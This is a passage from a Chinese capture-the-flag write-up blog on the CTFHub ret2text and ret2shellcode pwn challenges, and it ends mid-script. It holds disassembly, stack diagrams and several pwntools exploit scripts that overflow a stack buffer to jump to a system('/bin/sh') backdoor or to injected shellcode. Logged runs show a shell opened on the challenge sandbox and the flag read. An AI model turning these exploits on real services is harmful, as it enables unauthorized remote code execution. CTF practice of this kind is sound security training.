class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有一个secure函数，里面有<code>system(&#39;/bin/sh&#39;)</code>，需要找到 <code>system(&#39;/bin/sh&#39;)</code>函数的地址，这样就可以利用该函数获取shell</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821112909.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v0 = time(<span class="hljs-number">0LL</span>);<br>  srand(v0);<br>  v3 = rand();<br>  __isoc99_scanf(&amp;unk_4008C8, &amp;v2);<br>  result = v2;<br>  <span class="hljs-keyword">if</span> ( v3 == v2 )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>在system(“&#x2F;bin&#x2F;sh”);后面摁tab</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113201.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821142044.png" alt="image.png"></p><p>用反汇编，获取到system函数的地址。由于要完整调用，所以取lea指令的位置：<code>0x00000000004007b8</code>，也就是<code>0x4007b8</code><br>&#x2F;bin&#x2F;sh的地址为：0x4008CB</p><h2 id="！！！重点！！！"><a href="#！！！重点！！！" class="headerlink" title="！！！重点！！！"></a>！！！重点！！！</h2><p>此处，拿的是lea指令的位置</p><h2 id="gdb分析函数地址"><a href="#gdb分析函数地址" class="headerlink" title="gdb分析函数地址"></a>gdb分析函数地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; disassemble secure<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> secure:<br>   0x0000000000400777 &lt;+0&gt;:     push   rbp<br>   0x0000000000400778 &lt;+1&gt;:     mov    rbp,rsp<br>   0x000000000040077b &lt;+4&gt;:     sub    rsp,0x10<br>   0x000000000040077f &lt;+8&gt;:     mov    edi,0x0<br>   0x0000000000400784 &lt;+13&gt;:    call   0x400640 &lt;time@plt&gt;<br>   0x0000000000400789 &lt;+18&gt;:    mov    edi,eax<br>   0x000000000040078b &lt;+20&gt;:    call   0x400630 &lt;srand@plt&gt;<br>   0x0000000000400790 &lt;+25&gt;:    call   0x400680 &lt;rand@plt&gt;<br>   0x0000000000400795 &lt;+30&gt;:    mov    DWORD PTR [rbp-0x4],eax<br>   0x0000000000400798 &lt;+33&gt;:    lea    rax,[rbp-0x8]<br>   0x000000000040079c &lt;+37&gt;:    mov    rsi,rax<br>   0x000000000040079f &lt;+40&gt;:    lea    rdi,[rip+0x122]        <span class="hljs-comment"># 0x4008c8</span><br>   0x00000000004007a6 &lt;+47&gt;:    mov    eax,0x0<br>   0x00000000004007ab &lt;+52&gt;:    call   0x400670 &lt;__isoc99_scanf@plt&gt;<br>   0x00000000004007b0 &lt;+57&gt;:    mov    eax,DWORD PTR [rbp-0x8]<br>   0x00000000004007b3 &lt;+60&gt;:    cmp    DWORD PTR [rbp-0x4],eax<br>   0x00000000004007b6 &lt;+63&gt;:    jne    0x4007c4 &lt;secure+77&gt;<br>   0x00000000004007b8 &lt;+65&gt;:    lea    rdi,[rip+0x10c]        <span class="hljs-comment"># 0x4008cb</span><br>   0x00000000004007bf &lt;+72&gt;:    call   0x400620 &lt;system@plt&gt;<br>   0x00000000004007c4 &lt;+77&gt;:    nop<br>   0x00000000004007c5 &lt;+78&gt;:    leave<br>   0x00000000004007c6 &lt;+79&gt;:    ret<br>End of assembler dump.<br><br></code></pre></td></tr></table></figure><p>再用反汇编查看secure函数的代码，确定system(“&#x2F;bin&#x2F;sh”)的地址为<code>0x00000000004007b8</code>，即<code>0x4007b8</code></p><h2 id="gdb分析偏移"><a href="#gdb分析偏移" class="headerlink" title="gdb分析偏移"></a>gdb分析偏移</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">b main<br>run<br>n<br>n<br><br></code></pre></td></tr></table></figure><p>输入一串指令“AAAAAAAA”，查看stack，找到变量和rbp的距离</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113407.png" alt="image.png"></p><p>由于rbp指向的是old rbp，所以还需要加上8字节的填充</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>存在后门函数，直接把返回地址填写为后门函数的地址即可</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string">   后门函数_addr  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">     BBBBBBBBB   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">28062</span>)  <br> <br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<br><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>host=<span class="hljs-string">&#x27;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&#x27;</span><br>port=<span class="hljs-number">28062</span><br>io=connect(host,port)<br><br>padding = <span class="hljs-number">0x78</span> <span class="hljs-comment"># 16*7=112</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding,return_addr])<br><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>host = <span class="hljs-string">&#x27;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&#x27;</span><br>port = <span class="hljs-number">28062</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = connect(host, port)<br><br>padding = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;A&#x27;</span>,encoding=<span class="hljs-string">&quot;utf8&quot;</span>) * <span class="hljs-number">0x78</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<span class="hljs-comment">#类型不同不能拼接</span><br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp4"><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">28062</span>)  <br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113526.png" alt="image.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="汇编语言中mov和lea的区别"><a href="#汇编语言中mov和lea的区别" class="headerlink" title="汇编语言中mov和lea的区别"></a>汇编语言中mov和lea的区别</h3><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如：</p><p>lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。</p><p>而mov指令则恰恰相反，例如：</p><p>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_47565708/article/details/109748747?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-109748747-blog-126544094.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-109748747-blog-126544094.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=2"># CTFhub 技能树 PWN ret2text Python3 exp</a><br><a href="https://blog.csdn.net/m0_43405474/article/details/126544094"># CTFhub-pwn-[ret2text]-writeup</a><br><a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ofBtUNidwfzzuXMBNBr4SF.html"># ctfhub 官方 ret2text</a><br><a href="https://www.zhihu.com/question/40720890"># 汇编语言中mov和lea的区别有哪些？</a></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># ./pwn</span><br>Welcome to CTFHub ret2shellcode!<br>What is it : [0x7ffef2f86cb0] ?<br>Input someting :<br>1234qwer<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/ret2shellcode/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><h2 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to CTFHub ret2shellcode!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What is it : [%p] ?\n&quot;</span>, buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input someting : &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="gdb分析偏移-1"><a href="#gdb分析偏移-1" class="headerlink" title="gdb分析偏移"></a>gdb分析偏移</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821172447.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821164743.png" alt="image.png"></p><p>在上图可以看到，栈有可执行权限</p><p>可以把 shellcode 放在返回地址之后，然后把返回地址指向 shellcode。</p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>栈可执行，把shellcode放到栈上就可以</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">默认栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br><br>修改后栈帧<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    shellcode    </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (retaddr)     </span>|<br>                                           |<span class="hljs-string"> shellcode_addr  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">     BBBBBBBBB   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1-1"><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&quot;, 25197) </span><br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len(shellcode):&#x27;</span>,<span class="hljs-built_in">len</span>(shellcode))<br><br>buf_addr = io.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>)  <span class="hljs-comment">#截取到]为止的字符串</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br>buf_addr = buf_addr[-<span class="hljs-number">15</span>:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br>buf_addr = <span class="hljs-built_in">int</span>(buf_addr[-<span class="hljs-number">15</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment">#处理一下 然后为16进制</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br>shellcode_addr = buf_addr+<span class="hljs-number">32</span>   <span class="hljs-comment">#0x10+0x08+0x08 十进制为32</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x08</span>) + p64(shellcode_addr) + shellcode<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;payload:&#x27;</span>,payload)<br><br>io.sendline(payload)<br>io.interactive()<br><br><span class="hljs-comment"># python </span><br><span class="hljs-comment"># &gt;&gt;&gt; hex(140726337563760)</span><br><span class="hljs-comment"># &#x27;0x7ffd675c6c70&#x27;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">shellcode: b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">len(shellcode): 48</span><br><span class="hljs-string">buf_addr: b&#x27;Welcome to CTFHub ret2shellcode!\nWhat is it : [0x7ffd675c6c70]&#x27;</span><br><span class="hljs-string">buf_addr: b&#x27;0x7ffd675c6c70&#x27;</span><br><span class="hljs-string">buf_addr: 140726337563760</span><br><span class="hljs-string">payload: b&#x27;aaaaaaaaaaaaaaaaaaaaaaaa\x90l\\g\xfd\x7f\x00\x00jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"> ?</span><br><span class="hljs-string">Input someting :</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h3 id="exp2-1"><a href="#exp2-1" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>host=<span class="hljs-string">&#x27;challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com&#x27;</span><br>port=<span class="hljs-number">25197</span><br>io=connect(host,port)<br><br><br>padding=<span class="hljs-number">0x18</span><br><span class="hljs-comment">#Get the addr of buf</span><br>io.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr=io.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Input someting :&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;buf_addr:&#x27;</span>,buf_addr)<br><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding, p64(<span class="hljs-built_in">int</span>(buf_addr,<span class="hljs-number">16</span>)+<span class="hljs-number">32</span>), asm(shellcraft.sh())])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;payload:&#x27;</span>,payload)<br><br><br>io.sendline(payload)<br>io.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp2.py</span><br><span class="hljs-string">[+] Opening connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com on port 25197: Done</span><br><span class="hljs-string">buf_addr: b&#x27;0x7ffd6f060390&#x27;</span><br><span class="hljs-string">payload: b&#x27;aaaaaaaaaaaaaaaaaaaaaaaa\xb0\x03\x06o\xfd\x7f\x00\x00jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">bin</span><br><span class="hljs-string">dev</span><br><span class="hljs-string">flag</span><br><span class="hljs-string">lib</span><br><span class="hljs-string">lib32</span><br><span class="hljs-string">lib64</span><br><span class="hljs-string">pwn</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">ctfhub&#123;0ac15488cb9e428301839991&#125;</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to challenge-33d6be8b1c0e3fac.sandbox.ctfhub.com port 25197</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="exp3-1"><a href="#exp3-1" class="headerlink" title="exp3"></a>exp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 